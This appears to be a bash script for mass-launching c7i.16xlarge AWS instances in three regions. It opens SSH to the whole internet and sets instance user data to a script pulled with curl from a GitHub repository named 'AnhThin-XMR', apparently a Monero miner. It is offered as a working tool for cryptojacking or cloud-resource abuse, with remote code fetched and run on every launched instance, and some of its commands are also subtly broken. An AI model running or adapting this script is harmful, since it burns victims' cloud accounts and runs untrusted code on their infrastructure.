#!/bin/bash

# List of regions and corresponding image IDs
declare -A region_image_map=(
    ["us-east-1"]="ami-0e2c8caa4b6378d8c"
    ["us-west-2"]="ami-05d38da78ce859165"
    ["eu-central-1"]="ami-0a628e1e89aaedf80"
)

# GitHub URL containing the User Data
user_data_url="https://raw.githubusercontent.com/hoanglonglouis/AnhThin-XMR/refs/heads/main/AnhThinXmr"

# User Data Script
user_data_path=$(curl -s $user_data_url)

# Iterate over each region
for region in "${!region_image_map[@]}"; do
    echo "Processing region: $region"

    # Get the image ID for the region
    image_id=${region_image_map[$region]}

    # Check if Key Pair exists
    key_name="GodLong-$region"
    if aws ec2 describe-key-pairs --key-names $key_name --region $region > /dev/null 2>&1; then
        echo "Key Pair $key_name already exists in $region"
    else
        aws ec2 create-key-pair \
            --key-name $key_name \
            --region $region \
            --query "KeyMaterial" \
            --output text > ${key_name}.pem
        chmod 400 ${key_name}.pem
        echo "Key Pair $key_name created in $region"
    fi

    # Check if Security Group exists
    sg_name="Random-$region"
    sg_id=$(aws ec2 describe-security-groups --group-names $sg_name --region $region --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
    if [ -z "$sg_id" ]; then
        sg_id=$(aws ec2 create-security-group \
            --group-name $sg_name \
            --description "Security group for $region" \
            --region $region \
            --query "GroupId" \
            --output text)
        echo "Security Group $sg_name created with ID $sg_id in $region"
    else
        echo "Security Group $sg_name already exists with ID $sg_id in $region"
    fi

    # Check if SSH Port Rule exists
    if ! aws ec2 describe-security-group-rules --region $region --filters Name=group-id,Values=$sg_id Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
        aws ec2 authorize-security-group-ingress \
            --group-id $sg_id \
            --protocol tcp \
            --port 22 \
            --cidr 0.0.0.0/0 \
            --region $region
        echo "SSH (22) access enabled for Security Group $sg_name in $region"
    else
        echo "SSH (22) access already configured for Security Group $sg_name in $region"
    fi

    # Create Launch Template
    launch_template_name="SpotLaunchTemplate-$region"
    launch_template_id=$(aws ec2 create-launch-template \
        --launch-template-name $launch_template_name \
        --version-description "Version1" \
        --launch-template-data "{
            \"ImageId\": \"$image_id\",
            \"InstanceType\": \"c7i.16xlarge\",
            \"KeyName\": \"$key_name\",
            \"SecurityGroupIds\": [\"$sg_id\"],
            \"UserData\": \"$(base64 $user_data_path | tr -d '\n')\"
        }" \
        --region $region \
        --query "LaunchTemplate.LaunchTemplateId" \
        --output text)
    echo "Launch Template $launch_template_name created with ID $launch_template_id in $region"

    # Automatically select an available Subnet ID for Auto Scaling Group
    subnet_id=$(aws ec2 describe-subnets --region $region --query "Subnets[0].SubnetId" --output text)

    if [ -z "$subnet_id" ]; then
        echo "No available Subnet found in $region. Skipping region."
        continue
    fi

    echo "Using Subnet ID $subnet_id for Auto Scaling Group in $region"

    # Create Auto Scaling Group with selected Subnet ID
    asg_name="SpotASG-$region"
    aws autoscaling create-auto-scaling-group \
        --auto-scaling-group-name $asg_name \
        --launch-template "LaunchTemplateId=$launch_template_id,Version=1" \
        --min-size 1 \
        --max-size 1 \
        --desired-capacity 1 \
        --vpc-zone-identifier "$subnet_id" \
        --region $region
    echo "Auto Scaling Group $asg_name created in $region"

    # Launch 1 On-Demand EC2 Instance
    instance_id=$(aws ec2 run-instances \
        --image-id $image_id \
        --count 1 \
        --instance-type c7i.16xlarge \
        --key-name $key_name \
        --security-group-ids $sg_id \
        --user-data $user_data_path \
        --region $region \
        --query "Instances[0].InstanceId" \
        --output text)
    echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
done
